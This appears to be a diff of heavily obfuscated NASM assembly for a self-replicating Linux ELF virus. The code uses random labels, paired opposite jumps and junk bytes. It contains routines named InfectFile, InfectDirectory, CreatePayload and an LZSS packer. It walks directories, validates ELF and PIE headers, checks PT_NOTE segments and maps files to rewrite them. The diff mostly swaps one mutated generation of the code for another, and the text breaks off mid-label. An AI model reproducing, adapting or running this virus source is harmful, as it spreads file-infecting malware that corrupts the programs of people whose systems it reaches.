-db 0x66, 0x5a, 0xa3
-    jl          ..@DVJCJ6wds2pY
-    jge         ..@DVJCJ6wds2pY
-..@52zjtdLSJA99:
-    add         rdi, rax
-    xor         rax, rax
-    jmp         $+4
-db 0x24, 0x0c
-    js          ..@gp0fvL6gHrJJ
-    jns         ..@gp0fvL6gHrJJ
-..@QjZtc1YaXCYW:
-    xor         rcx, rcx
-    je          ..@mD6Cxj3naRXn
-    jne         ..@mD6Cxj3naRXn
-..@PnKaLwI05pXi:
-    test        eax, eax
-    jnz         ..@YwG9ihM9qb21
-    jmp         $+4
-db 0xe0, 0xae
-    jmp         ..@EPCScpJhypn6
-..@7x8zIdwiS6Df:
-    cmp         r4w, WORD [r1+e_h.e_phnum]
-    jge         ..@euuEa0fW43Iv
-    js          ..@VR9SyCt39z1P
-    jns         ..@VR9SyCt39z1P
-..@nyld1e4PlQBr:
-    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
-    jb          ..@52zjtdLSJA99
-    jae         ..@52zjtdLSJA99
-..@js4SGjaxQUky:
-    jz          ..@KaTG2Mzx4E9f
-    cmp         BYTE [r1], 0x30
-    jb          ..@IlgxZhqGE2pH
-    jae         ..@IlgxZhqGE2pH
-..@ePbeJMTCOGJ8:
-    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
-    js          ..@1EJnDRu4grVx
-    jns         ..@1EJnDRu4grVx
-..@KFtTiQqgTfVn:
-    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
-    jge         ..@O14yMr9qd0CV
-    jmp         $+3
-db 0x87
-    jl          ..@6f9XKeKC3fyE
-    jge         ..@6f9XKeKC3fyE
-..@ut20SMq2b2sr:
-    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
-    jl          ..@58ZAdBsY5v3m
-    jmp         ..@nrmcUzOm62AS
-    jmp         $+5
-db 0xca, 0x87, 0xce
-    jmp         $+3
-db 0xcc
-    jmp         ..@DcDtRgOg12Rm
-..@FiKPaav11RK6:
-    jle         ..@euuEa0fW43Iv
-    jmp         $+4
-db 0x8c, 0xe0
-    jmp         ..@D73XcWd2C3dT
-..@WKNafgZ3kLCX:
-    jmp         ..@rD2cXF7ZO4YY
-    jmp         $+3
-db 0x08
-    jmp         $+3
-db 0x82
-    jmp         ..@4BxzAjnCWS4s
-..@HRMWWCOyFdG7:
-    add         r1, 2
-    js          ..@kz9sDqQCameL
-    jns         ..@kz9sDqQCameL
-..@1KoEGiYgOF3S:
-    add         rsi, WINDOW_LENGTH
-    rep         movsb
-    jmp         $+3
-db 0xf8
-    jmp         $+4
-db 0xab, 0x5e
-    jmp         $+3
-db 0xc4
-    js          ..@EFJXOtiSfves
-    jns         ..@EFJXOtiSfves
-..@S5FKs9k29EgY:
-    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
-    add         r1, e_h.e_shentsize
-    jmp         $+5
-db 0xdc, 0x84, 0x7e
-    jmp         $+4
-db 0x6c, 0x20
-    jl          ..@zmOSneguy62o
-    jge         ..@zmOSneguy62o
-..@iQftN2lmjBWW:
-    rep         stosb
-    jmp         $+5
-db 0xe5, 0xe7, 0xb2
-    jmp         $+4
-db 0xa3, 0xcc
-    jmp         $+5
-db 0x2d, 0xf2, 0x3e
-    jl          ..@qVphEtHpxWcs
-    jge         ..@qVphEtHpxWcs
-..@8Ab4behoWTyP:
-    je          ..@bjzmvM4h4dFg
-    jmp         $+3
-db 0xfc
-    jmp         $+4
-db 0x60, 0x04
-    jmp         ..@ZkxPH3idP5Oq
-..@YWNw5OKqSvoa:
-%ifdef X86_32
-    pop         ebp
-%endif
-    jmp         ..@5zE66LUpYUst
-..@l46LJYz4unQo:
-    push        r1
-    jmp         $+4
-db 0x10, 0x20
-    jl          ..@TbGj71un8pGT
-    jge         ..@TbGj71un8pGT
-..@x8mVuOrKh4f3:
-    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
-    jmp         $+5
-db 0x54, 0x1c, 0x2e
-    jmp         $+5
-db 0xa4, 0x82, 0x53
-    jmp         $+5
-db 0x81, 0x7f, 0x3d
-    jb          ..@Mrh0MoD2KLuS
-    jae         ..@Mrh0MoD2KLuS
-..@ivkBt6mNW3iJ:
-    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
-    jmp         $+4
-db 0xe4, 0x5e
-    js          ..@zi1ZZHrxCJyH
-    jns         ..@zi1ZZHrxCJyH
-..@wfZJsal6p2cD:
-    xor         rax, rax
-    jmp         ..@tKdZEFRgeNtZ
-..@wZ3gNGSXS9mq:
-    add         r1, 1
-    add         r2, 1
-    jmp         Strcpy
-    jb          ..@0gciQTYG20PJ
-    jae         ..@0gciQTYG20PJ
-..@Gi66SrK0YdF0:
-    mov         r1, [rsp+_NBF_OFF.file]
-    mov         r2, signature_len
-    call        AddSizeMappedFile
-    je          ..@2aaSVFWeZN2E
-    jne         ..@2aaSVFWeZN2E
-LzssEncoder:
-    jmp         ..@vgrXkZk9d9co
-..@sy7HgHpr7sqf:
-    xor         r1, r1
-    jmp         ..@fNSudO0Jcbl5
-..@QgoEN2U9JQpb:
-    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
-    jmp         $+4
-db 0x1c, 0xfb
-    jl          ..@SWqGghrXh8js
-    jge         ..@SWqGghrXh8js
-..@48sKL4SMcfeR:
-    rep         movsb
-    je          ..@t2VV5wOcTyqS
-    jne         ..@t2VV5wOcTyqS
-..@5a7S5yXSWwj2:
-%ifdef X86_64
-    xor         r9, r9
-%endif
-    jl          ..@w60nKevQPmVr
-    jge         ..@w60nKevQPmVr
-..@MfZ6he4x2IKp:
-    cmp         BYTE [r5], DT_REG
-    jb          ..@2yIwi554kd9P
-    jae         ..@2yIwi554kd9P
-..@VTPxk9lykrYx:
-    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
-    js          ..@GL51aeMXrvkM
-    jns         ..@GL51aeMXrvkM
-DYNPIEValidation:
-    jmp         ..@hXaZZP74TQGS
-..@vULqIXN9JSsi:
-    sub         rsp, _INFFILE_OFF_size
-    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
-    lea         r1, [rsp+_INFFILE_OFF.file]
-    jmp         $+3
-db 0x82
-    jmp         $+5
-db 0x7b, 0xb1, 0xac
-    jmp         ..@6u57JzVvJWLE
-..@kcyKEucwC1HK:
-    push        0x00
-    mov         rax, SYS_GETUID
-    jmp         $+4
-db 0x20, 0x2f
-    jmp         ..@nHdjWfiGAtQT
-..@COdNIXAjfRSb:
-    add         rdi, rax
-    jmp         $+5
-db 0x4c, 0x98, 0xbb
-    jl          ..@XHtCLPRFGDE8
-    jge         ..@XHtCLPRFGDE8
-..@t2ICBlD3q23b:
-    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
-    js          ..@QgoEN2U9JQpb
-    jns         ..@QgoEN2U9JQpb
-..@aaNLw9LlpHTO:
-    pop         r1
-    js          ..@kOqOtiBUGYnC
-    jns         ..@kOqOtiBUGYnC
-..@eKzn1BW5MpxW:
-    jz          ..@Bs41apZmHGw8
-    jmp         $+5
-db 0x7c, 0xdd, 0x81
-    jmp         ..@JdTG9TjWqhmY
-..@2u73pfP6UK9f:
-    push        r4
-    jl          ..@GTn0D750zTwj
-    jge         ..@GTn0D750zTwj
-..@8PHG4FxEohdQ:
-    push        r1
-    push        r2
-    push        r3
-    jmp         ..@4TTwcZBDJvu1
-..@1EJnDRu4grVx:
-    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
-    jl          ..@yQFgUEq9ePlx
-    jge         ..@yQFgUEq9ePlx
-..@ACjEQquokkrs:
-    cmp         BYTE [r2], 0x0
-    je          ..@saSBHSM8RlE5
-    jne         ..@saSBHSM8RlE5
-..@ILFuuzyNwwVx:
-    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
-    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
-    jmp         ..@SI1lEJhUeuOZ
-..@B14Z6pbv97PY:
-    mov         rax, rdi
-    jb          ..@PUOjOK1p4ttG
-    jae         ..@PUOjOK1p4ttG
-..@DVJCJ6wds2pY:
-    add         rax, rbx
-    add         rsp, _VADDR_OFF_size
-    pop         r1
-    jb          ..@U4LC03WW1yCd
-    jae         ..@U4LC03WW1yCd
-..@054cato4LXbq:
-    ret
-    jmp         $+5
-db 0x2f, 0xf5, 0x1b
-    jl          FileValidation
-    jge         FileValidation
-..@LTuUYH2ylOf7:
-    xor         rax, rax
-    jmp         $+4
-db 0xd9, 0x9a
-    jmp         ..@ihwnYo1hhq3t
-..@fLW0lOAiStvm:
-    jne         ..@lsrxRNxO1dmY
-    mov         r2, QWORD [r5+file.fileptr]
-    jmp         $+5
-db 0x64, 0xc1, 0x8c
-    jb          ..@b62JGoGb3HNZ
-    jae         ..@b62JGoGb3HNZ
-..@zi1ZZHrxCJyH:
-    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
-    jmp         ..@KlGqrzMXt6gm
-..@wgF4cJ2s18wR:
-    add         r1, signature_len
-    jmp         $+5
-db 0x96, 0x1e, 0xad
-    jb          ..@xEPTpcUrD2Kg
-    jae         ..@xEPTpcUrD2Kg
-..@ePI4vMzga5R1:
-    mov         r1, QWORD [r5+file.fileptr]
-    jmp         $+3
-db 0x40
-    jl          ..@NjhDHRvwvtqN
-    jge         ..@NjhDHRvwvtqN
-..@YUarNTrxk736:
-    pop         r2
-    pop         r1
-    jmp         $+5
-db 0x4c, 0x37, 0xcb
-    jmp         ..@7vaX2I0MykWJ
-..@gp0fvL6gHrJJ:
-    xor         rbx, rbx
-    jl          ..@TLgFmr4pt3Wm
-    jge         ..@TLgFmr4pt3Wm
-..@AyUN2hpX3hVJ:
-    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
-    cmp         BYTE [r1], '.'
-    jl          ..@TYCrqD8y9aLB
-    jge         ..@TYCrqD8y9aLB
-..@DLpNmgqGJ5R6:
-    xor         rax, rax
-    jmp         $+4
-db 0x9d, 0x4c
-    jmp         ..@o8k4c1U1ZkLe
-..@dEU9e7s2fJjp:
-    xor         rdx, rdx
-    jmp         ..@H5N9Wse746Gg
-..@uhB4T9yYHOBi:
-    mov         r1, r5
-    jmp         $+3
-db 0x27
-    jmp         $+5
-db 0xea, 0xbe, 0x0f
-    js          ..@Jf3YEJY80kAR
-    jns         ..@Jf3YEJY80kAR
-..@pKysl2wLF12v:
-    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
-    jmp         $+3
-db 0x34
-    jl          ..@FfxFhndU7bMs
-    jge         ..@FfxFhndU7bMs
-..@VvEpqiQ5nlEH:
-    add         rsi, rdx
-    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
-    add         ecx, 1
-    jmp         $+4
-db 0x66, 0x0e
-    jb          ..@bqOfxcL8j1z6
-    jae         ..@bqOfxcL8j1z6
-..@2U7pgjbVf5pd:
-    and         eax, 0xff
-    or          edi, eax
-    jl          ..@SwFTvu0xO5k2
-    jge         ..@SwFTvu0xO5k2
-..@Tz071gMscT7I:
-    CFILE       DWORD [rsp+_PROC_OFF.filefd]
-    jl          ..@ILFuuzyNwwVx
-    jge         ..@ILFuuzyNwwVx
-..@n1S7xe2OADGy:
-    cmp         WORD [r1], './'
-    jmp         $+4
-db 0x78, 0x2a
-    jmp         $+4
-db 0x68, 0xcf
-    js          ..@QMwawIlEQSZE
-    jns         ..@QMwawIlEQSZE
-..@xggPZb98iCPw:
-    je          ..@lsrxRNxO1dmY
-    mov         rax, 2
-    jl          ..@yfYzutYWRqnJ
-    jge         ..@yfYzutYWRqnJ
-..@4mIu1UioB46k:
-    push        r2
-    jmp         ..@5Zm5I8fLrIP2
-..@oTU3rbr3VA5M:
-    add         rsp, _NBF_OFF_size
-    jmp         $+5
-db 0x90, 0xd7, 0xd6
-    jmp         ..@YY3KMG19jVCY
-..@rn7kPe4N1PuQ:
-    ret
-    jmp         $+4
-db 0x48, 0x5c
-    jmp         InfectFile
-..@IQENnfnKVMo5:
-    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
-    add         r2, 1
-    call        InfectDirectory
-    jmp         $+4
-db 0xa0, 0x8c
-    jmp         ..@QWIMFFoewkp9
-FileValidation:
-    jmp         ..@gd98rcYricTG
-..@fdZp2SP6azED:
-    xor         rax, rax
-    js          ..@84jEznymDDGp
-    jns         ..@84jEznymDDGp
-..@Kp01QP34HkWN:
-    jne         ..@ka0jQnnnblRE
-    jmp         $+4
-db 0x99, 0x67
-    js          ..@6ASJyskr16lF
-    jns         ..@6ASJyskr16lF
-Strcpy:
-    jmp         ..@ACjEQquokkrs
-..@G3ZtePNqPNu3:
-    jmp         ..@AhYZ2QbGV74B
-    jmp         $+4
-db 0xfc, 0x54
-    jb          ..@D5Wqi7wAM3ma
-    jae         ..@D5Wqi7wAM3ma
-..@ESiCsSHVmHIn:
-    add         r4, 1
-    jmp         $+3
-db 0x63
-    je          ..@SnrmcoGtRi9Y
-    jne         ..@SnrmcoGtRi9Y
-..@w60nKevQPmVr:
-%ifdef X86_64
-    mov         rsi, original_virus_len+PADDING
-    mov         edx, 11b
-    mov         r10, 0x22
-%endif
-    je          ..@g5nPp5NufSKl
-    jne         ..@g5nPp5NufSKl
-..@EiQxSn9l5KFR:
-    xor         rax, rax
-    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
-    add         WORD [rsp+_LZSSE_OFF.la_index], ax
-    jmp         ..@JVcwtL453T2T
-..@2yIwi554kd9P:
-    jne         ..@pKysl2wLF12v
-    jb          ..@FDNITf5PjDoB
-    jae         ..@FDNITf5PjDoB
-..@6sMhifIxZAia:
-    cmp         eax, 0x3
-    jb          ..@4dnxtYuESPaq
-    jae         ..@4dnxtYuESPaq
-..@WEinlt0eDrNJ:
-    mov         QWORD [rdi], rsi
-    xor         rax, rax
-    xor         rcx, rcx
-    jl          ..@UoW918sKBxNt
-    jge         ..@UoW918sKBxNt
-..@mDCfi2PnMyIL:
-    jmp         ..@OX1iWJ3FaBHB
-    jb          ..@lHA1dfwVsdfi
-    jae         ..@lHA1dfwVsdfi
-..@ZJG6O1uUQ9iV:
-    call        CreatePayload
-    jmp         $+5
-db 0xba, 0xdc, 0x97
-    jl          ..@MgjANKaPl1LN
-    jge         ..@MgjANKaPl1LN
-..@UF9cGT9nbHh5:
-    rep         movsb
-    cld
-    jb          ..@G3ZtePNqPNu3
-    jae         ..@G3ZtePNqPNu3
-..@s7mNbStXFytJ:
-    mov         ecx, WINDOW_LENGTH
-    jmp         $+3
-db 0x74
-    je          ..@QghO61EqL9cB
-    jne         ..@QghO61EqL9cB
-..@M2nY5bqDxRtj:
-    jmp         ..@ihwnYo1hhq3t
-    js          ..@vjEEbCmDhFFh
-    jns         ..@vjEEbCmDhFFh
-..@gQvvxN7q3uVp:
-    mov         rax, r4
-    js          ..@YJPKcIJIgDDd
-    jns         ..@YJPKcIJIgDDd
-..@mE78TPGUdYIr:
-    mov         edx, 1
-    jmp         $+4
-db 0x83, 0x4d
-    jmp         ..@xCtd1MYxnldF
-..@kOqOtiBUGYnC:
-    ret
-    jmp         $+5
-db 0x30, 0xfe, 0x25
-    jl          WORDToDWORDASCII
-    jge         WORDToDWORDASCII
-..@aISdAxRTjYiM:
-    mul         r3
-    add         rax, p_h.p_type
-    cmp         DWORD [r2+rax], PT_NOTE
-    jmp         $+4
-db 0xa7, 0x3b
-    js          ..@teIXRbExsdIU
-    jns         ..@teIXRbExsdIU
-..@JZSI56vJgarr:
-    add         r1, rax
-    sub         r1, 1
-    jmp         ..@FY6pjiMu0i8B
-..@XYOxvfOeSK8B:
-    cmp         r2, 0
-    jmp         $+4
-db 0xd2, 0x42
-    je          ..@iDxKlYzNsuN4
-    jne         ..@iDxKlYzNsuN4
-..@fxcdh7nAPugj:
-    mov         rax, SYS_FTRUNCATE
-    syscall
-    test        al, al
-    jmp         ..@ALXjQ5AgVMpO
-..@92nN44UNodNG:
-    add         m7, rax
-    mov         rdi, m6
-    jmp         $+5
-db 0x4c, 0x4c, 0x55
-    jmp         ..@tvphuN1THXBF
-..@0gciQTYG20PJ:
-    ret
-    jmp         $+5
-db 0xc5, 0x49, 0xb1
-    jmp         $+4
-db 0xc9, 0x01
-    jmp         $+5
-db 0xbd, 0xe0, 0xc4
-..@ZNUTDErLIkSX:
-%ifdef X86_32
-    mov         ecx, r3
-%endif
-    jl          ..@aINLPXnbONsS
-    jge         ..@aINLPXnbONsS
-..@pptnV0zp6suR:
-    lea         r1, [rsp+_PROC_OFF.buffer]
-    js          ..@izs06Jzt6tgb
-    jns         ..@izs06Jzt6tgb
-..@FsmAu6mYsZ8L:
-    cmp         BYTE [r1+4], ELFCLASS
-    jmp         $+4
-db 0x6c, 0x94
-    jb          ..@MMNkTspjPy41
-    jae         ..@MMNkTspjPy41
-..@y5oqMFwavmZD:
-    sub         ebx, 1
-    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
-    jge         ..@POieD0xhJdu5
-    jb          ..@KFtTiQqgTfVn
-    jae         ..@KFtTiQqgTfVn
-..@PgQmpf1Jtj6c:
-    mov         ecx, PADDING
-    jmp         $+5
-db 0xfb, 0x03, 0x74
-    jl          ..@d4Eova5OMbXN
-    jge         ..@d4Eova5OMbXN
-..@ej65ZzKjvLsa:
-    pop         r5
-    jl          ..@QJekXI9B1FEY
-    jge         ..@QJekXI9B1FEY
-..@Bamjl3uaEZI2:
-    push        r1
-    jb          ..@uhB4T9yYHOBi
-    jae         ..@uhB4T9yYHOBi
-..@5RVJqyGzHlzo:
-    jmp         ..@jVgWGHmGg8sU
-    jmp         ..@O14yMr9qd0CV
-..@6YT2VcLD84vT:
-    add         r1, non_packed_len+PADDING
-    jmp         $+3
-db 0x61
-    jmp         ..@ePcDwQE5E4H9
-..@HqGJRUxtbm9g:
-    jz          ..@lsrxRNxO1dmY
-    jmp         ..@mdoONnvkenq3
-..@QLDyIRAQVtcS:
-    cmp         BYTE [r5], DT_DIR
-    jne         ..@MfZ6he4x2IKp
-    jmp         $+4
-db 0xeb, 0x95
-    js          ..@huxosuvGD6CT
-    jns         ..@huxosuvGD6CT
-..@CtcG4ensOHGo:
-%ifdef X86_32
-    mov         esi, r2
-%endif
-    jmp         $+5
-db 0xb3, 0x6a, 0x66
-    jmp         $+5
-db 0x84, 0xe8, 0x1c
-    jmp         ..@ZNUTDErLIkSX
-..@ZkxPH3idP5Oq:
-    cmp         BYTE [r1+16], ET_DYN
-    jmp         $+5
-db 0x9b, 0xc7, 0x32
-    jl          ..@vBaK7cKGmvIL
-    jge         ..@vBaK7cKGmvIL
-..@DqWdiCKqXrZx:
-    mov         r2, QWORD [r5+file.filesize]
-    jmp         $+5
-db 0x9a, 0xab, 0x83
-    jmp         ..@uhcQ4Roh9CJw
-..@AhYZ2QbGV74B:
-    pop         r5
-    jmp         ..@ZrddbvLlbrJd
-..@tYpBXhiT7uH5:
-    xor         r4, r4
-    jmp         $+5
-db 0x37, 0xa5, 0x3d
-    jmp         $+3
-db 0x99
-    jl          ..@O9zsmz7vGk1Q
-    jge         ..@O9zsmz7vGk1Q
-..@3FP61YZXVpfB:
-    add         rsp, _DYNPIE_OFF_size
-    pop         r2
-    pop         r3
-    jmp         $+3
-db 0x03
-    jmp         ..@oVCx4er5rGCq
-..@77PdTXrq5sYZ:
-    cmp         BYTE [r1], 0x00
-    je          ..@uQqs81K0AI4f
-    jmp         $+3
-db 0x57
-    jmp         ..@Bamjl3uaEZI2
-..@NjhDHRvwvtqN:
-    mov         r2, QWORD [r5+file.filesize]
-    mov         rax, SYS_MUNMAP
-    jb          ..@c09bVhX75nB0
-    jae         ..@c09bVhX75nB0
-..@vAHBVmtASHjp:
-    sub         r2, 1
-    jl          ..@Gd6cFRm7kHZN
-    jge         ..@Gd6cFRm7kHZN
-..@oTJlm0JwKNMX:
-    je          ..@ZUdwnS592kxe
-    js          ..@jJDowb06RRfm
-    jns         ..@jJDowb06RRfm
-..@p36lNEUiWvGf:
-    call_vsp    ExitProgram
-    jmp         $+3
-db 0xf6
-    jmp         ..@nRtImfModyJv
-..@4TTwcZBDJvu1:
-    mov         r1, r4
-    mov         r2, m5
-    jl          ..@ZJG6O1uUQ9iV
-    jge         ..@ZJG6O1uUQ9iV
-..@bevTeB47452q:
-    jg          ..@FLCq9KmgNSsB
-    jmp         $+4
-db 0x34, 0xe5
-    jb          ..@zoIUgqqBx2Ke
-    jae         ..@zoIUgqqBx2Ke
-..@wZrav6LPEbqq:
-    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
+db 0x73, 0xad
+    jmp         ..@PcRi3GUg7dO2
+..@wclrNHCxHZ5n:
+    jmp         ..@AT4Mi9T5InEx
+    jmp         ..@dHBJw1fYedmk
+..@43y2LsKZfc2a:
     mov         al, BYTE [rsp+_LZSSE_OFF.mask]
     test        al, al
-    je          ..@WaEEIpCaaTmf
-    jne         ..@WaEEIpCaaTmf
-..@BJf69DvPhaVt:
-    xor         r3, r3
-    js          ..@tYpBXhiT7uH5
-    jns         ..@tYpBXhiT7uH5
-..@RP2aG35z1M4L:
-    xor         r3, r3
-    js          ..@9dYDPlOQ1qqq
-    jns         ..@9dYDPlOQ1qqq
-..@2aaSVFWeZN2E:
-    mov         r5, [rsp+_NBF_OFF.file]
-    mov         r1, QWORD [r5+file.fileptr]
-    mov         r2, r1
-    jmp         $+4
-db 0x6c, 0xed
-    jmp         $+4
-db 0xed, 0x78
-    jmp         ..@wgF4cJ2s18wR
-..@CNomVVKX86Uz:
-    mov         DWORD [r5+file.filefd], eax
-    jmp         ..@ePD4omuMtgwB
-..@vJD07H5GOYam:
-    mov         r1, m6
-    jmp         $+4
-db 0xa7, 0xdf
-    jmp         $+3
-db 0x9f
-    jmp         ..@OnITfync9t1X
-..@iDxKlYzNsuN4:
-    je          ..@HUhjopsW1qpk
-    jmp         ..@8HixdbI99e65
-..@0XgxzafaQmft:
-    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
-    GGLOBAL     _signature.start
-    mov         rsi, r5
-    jmp         ..@qrOmCuZBqPd6
-..@XHtCLPRFGDE8:
-    xor         rax, rax
-    jb          ..@1YEJrEQ3c3Rs
-    jae         ..@1YEJrEQ3c3Rs
-..@qUYc19sDKmG6:
-    CFILE       DWORD [r5+file.filefd]
-    jmp         ..@8rJYtOwNTCCE
-..@J0cTxm5Z04sQ:
-    call        InfectFile
-    jmp         ..@pKysl2wLF12v
-..@UoW918sKBxNt:
-    mov         rdi, m7
-    jb          ..@PgQmpf1Jtj6c
-    jae         ..@PgQmpf1Jtj6c
-..@5sdBo8hPKRyb:
-    ret
-    jmp         $+3
-db 0x75
-    jmp         GetNewProgramVaddr
-..@mD6Cxj3naRXn:
-    mov         ecx, signature_len
-    jmp         $+5
-db 0xe9, 0x33, 0x62
-    jl          ..@M5yAUZFvIoos
-    jge         ..@M5yAUZFvIoos
-..@kwK632gyAST4:
-    xor         rax, rax
-    jmp         $+4
-db 0x7c, 0x0c
-    jmp         ..@0sBLE6lw0513
-IsNum:
-    jmp         ..@LTuUYH2ylOf7
-..@ALXjQ5AgVMpO:
-    jnz         ..@Ay0Bf7Fn2y08
-    jmp         $+3
-db 0x2e
-    jmp         $+5
-db 0x8f, 0xc1, 0x69
-    jmp         $+5
-db 0x0c, 0xce, 0xe5
-    js          ..@fiQcplWSg65O
-    jns         ..@fiQcplWSg65O
-..@Bs41apZmHGw8:
-    CFILE       DWORD [rsp+_PROC_OFF.filefd]
-    jl          ..@sy7HgHpr7sqf
-    jge         ..@sy7HgHpr7sqf
-UnmapFile:
-    jmp         ..@lD6mTKIgqZmi
-..@EKKc3SU51hI1:
-    OFILE       [rsp+_PROC_OFF.buffer], 0x00
-    jmp         $+3
-db 0x56
-    js          ..@HbL75KFJcaug
-    jns         ..@HbL75KFJcaug
-..@cYkAzH0AcoVP:
-    mov         rdi, m6
-    jmp         ..@ULdlO5sCBaEo
-..@8vlF52B1qVei:
-    je          ..@Ay0Bf7Fn2y08
-    mov         QWORD [r5+file.fileptr], rax
-    mov         QWORD [r5+file.filesize], r3
-    jmp         $+4
-db 0xb8, 0xe1
-    jmp         $+5
-db 0xd9, 0x76, 0x41
-    jb          ..@ual95S5jRqtH
-    jae         ..@ual95S5jRqtH
-..@320Wzi4DABiz:
-    mov         edx, LOOKAHEAD_LENGTH
-    cmp         ax, LOOKAHEAD_LENGTH
-    cmovl       dx, ax
-    jmp         ..@0UQVTgcJs5sR
-..@DcDtRgOg12Rm:
-    CFILE       [rsp+_INFDIR_OFF.dirfd]
-    jmp         $+5
-db 0x92, 0x83, 0x14
-    jb          ..@yPMZPERcrcUG
-    jae         ..@yPMZPERcrcUG
-..@xCtd1MYxnldF:
-    shl         edx, POSITION_BITS+LENGTH_BITS
-    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
-    jmp         ..@0ROco8XYMcgp
-..@mdoONnvkenq3:
-    and         r2, 1b
-    jmp         $+3
-db 0x7c
-    jl          ..@ln0Rik1zYHIz
-    jge         ..@ln0Rik1zYHIz
-..@QIFNOHBegV8C:
-    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
-    jmp         ..@hWAu9P1sO9kb
-..@Wueh5ufWGc4A:
-    je          ..@pKysl2wLF12v
-    jmp         $+3
-db 0x38
-    jmp         $+5
-db 0x78, 0x0c, 0x28
-    je          ..@spOGFvUt5fd3
-    jne         ..@spOGFvUt5fd3
-..@UlnagV2qeBVj:
-    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
-    jmp         $+3
-db 0x4d
-    jmp         ..@XoZL0fvr8HJX
-..@cCPucnqVfrIj:
-    OFILE       [r1], 0x10000
-    cmp         eax, 0x03
-    jl          ..@BDEk2VWBSnzH
-    jmp         $+5
-db 0xe8, 0xe0, 0xba
-    js          ..@qnAfwFfZP4Rz
-    jns         ..@qnAfwFfZP4Rz
-..@ZUdwnS592kxe:
-    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
-    mov         r2, QWORD [r1+e_h.e_phoff]
-    jl          ..@vinhmRIJvtGj
-    jge         ..@vinhmRIJvtGj
-..@xwpcULTOrJZO:
-    syscall
-    js          ..@0Fr7A6CYEBO0
-    jns         ..@0Fr7A6CYEBO0
-..@V6EBjfRBvj0g:
-    cmp         r1, e_h_size
-    jge         ..@glpZTnE4Q9X4
-    cmp         r1, 0x00
-    jmp         $+5
-db 0x41, 0xcd, 0x13
-    jmp         ..@bevTeB47452q
-..@PU0sbR5fBVXP:
-    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
-    jmp         ..@y5oqMFwavmZD
-..@BqrBvFU1il9X:
-    mov         r1, m6
+    jl          ..@FwrEdYABRkw3
+    jge         ..@FwrEdYABRkw3
+..@sLwgKSYSsHZn:
+    je          ..@R4FxM6IERCtl
+    mov         rax, 2
     jmp         $+3
 db 0x30
-    jmp         $+4
-db 0x2a, 0x79
-    jmp         ..@6YT2VcLD84vT
-..@SnrmcoGtRi9Y:
-    jmp         ..@3302X8uI8jY1
-    jb          ..@Bs41apZmHGw8
-    jae         ..@Bs41apZmHGw8
-..@bjzmvM4h4dFg:
-    mov         r1, QWORD [r5+file.fileptr]
-    mov         r2, QWORD [r1+e_h.e_entry]
-    jmp         ..@Nrs5Qzzzgwlb
-..@tzF2sdVqQfEW:
-    call_vsp    GetEnv
+    jmp         $+5
+db 0x3e, 0xec, 0x1c
+    jb          ..@UTAheQLoudYG
+    jae         ..@UTAheQLoudYG
+..@gI4riGJKnxAm:
+    sub         r4, QWORD [r1+e_h.e_entry]
+    jb          ..@aHIbMhtktNDd
+    jae         ..@aHIbMhtktNDd
+..@lDPCQjI2IXkd:
     test        rax, rax
-    jz          ..@6LbVzp1rGMXw
-    jmp         $+5
-db 0x98, 0x2e, 0x4b
-    jl          ..@sTNggXhmKe56
-    jge         ..@sTNggXhmKe56
-..@QJekXI9B1FEY:
-    pop         r4
-    jb          ..@DYH8r9hIF0lI
-    jae         ..@DYH8r9hIF0lI
-..@HLdlnD92s7FX:
-    add         r4, rax
-    jmp         ..@ut20SMq2b2sr
-AddSizeMappedFile:
-    jmp         ..@TLQksCwlsS6m
-..@ZZcEz2nWKggd:
-    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
+    jb          ..@css0Mku3Lg6e
+    jae         ..@css0Mku3Lg6e
+..@EwwXMTBBWSfX:
+    add         WORD [rsp+_LZSSE_OFF.la_index], ax
+    add         WORD [rsp+_LZSSE_OFF.w_index], ax
+    jmp         ..@admmFm0dmqQ6
+..@GmHTSRd027zE:
+    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
+    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
     jmp         $+3
-db 0x38
-    jmp         $+4
-db 0x6e, 0x70
-    jmp         ..@48sKL4SMcfeR
-..@CSjfQY8M95dR:
-    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
-    jl          ..@ehFobrxPjNph
-    jl          ..@gUlQEPT1UqNB
-    jge         ..@gUlQEPT1UqNB
-..@Pe5JlxJEsV3g:
-    jne         ..@ERlzDxHmndSk
-    jmp         $+4
-db 0x90, 0xba
-    js          ..@ERlzDxHmndSk
-    jns         ..@ERlzDxHmndSk
-..@nrmcUzOm62AS:
-    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
+db 0x88
+    js          ..@mZiVHHiV3xzU
+    jns         ..@mZiVHHiV3xzU
+..@qah3BI5phGpq:
+    add         r1, rax
     jmp         $+3
-db 0x44
-    jb          ..@vu5VhrPUjB4B
-    jae         ..@vu5VhrPUjB4B
-..@w6G98YpLK78T:
